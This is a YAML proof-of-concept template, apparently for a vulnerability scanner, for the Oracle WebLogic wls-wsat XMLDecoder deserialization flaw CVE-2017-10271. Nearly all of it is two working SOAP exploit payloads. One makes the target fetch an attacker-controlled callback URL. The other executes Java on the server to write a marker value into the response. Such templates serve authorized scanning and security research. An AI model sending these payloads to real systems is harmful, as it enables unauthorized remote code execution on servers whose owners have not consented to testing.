name: poc-yaml-weblogic-cve-2017-10271
set:
  reverse: newReverse()
  reverseURL: reverse.url
groups:
  reverse:
    - method: POST
      path: /wls-wsat/CoordinatorPortType
      headers:
        Content-Type: text/xml
      body: >-
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  <java> <void class="java.net.URL"> <string>{{reverseURL}}</string> <void method="openConnection"><void method="getInputStream"/></void></void></java> </work:WorkContext> </soapenv:Header>  <soapenv:Body/> </soapenv:Envelope>
      follow_redirects: true
      expression: >
        reverse.wait(5)

  echo:
    - method: POST
      path: /wls-wsat/CoordinatorPortType
      headers:
        Content-Type: text/xml
      body: >-
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork"><void method="getResponse"><void method="getServletOutputStream"><void method="write"><array class="byte" length="9"><void index="0"><byte>50</byte></void><void index="1"><byte>50</byte></void><void index="2"><byte>53</byte></void><void index="3"><byte>55</byte></void><void index="4"><byte>55</byte></void><void index="5"><byte>51</byte></void><void index="6"><byte>48</byte></void><void index="7"><byte>57</byte></void><void index="8"><byte>49</byte></void></array></void><void method="flush"/></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope></soapenv:Envelope>
      follow_redirects: true
      expression: >
        response.body.bcontains(b"225773091")
detail:
  vulnpath: "/wls-wsat/CoordinatorPortType"
  author: fnmsd(https://github.com/fnmsd)
  description: "Weblogic wls-wsat XMLDecoder deserialization RCE CVE-2017-10271"
  links:
    - https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
    - https://github.com/QAX-A-Team/WeblogicEnvironment
    - https://xz.aliyun.com/t/5299
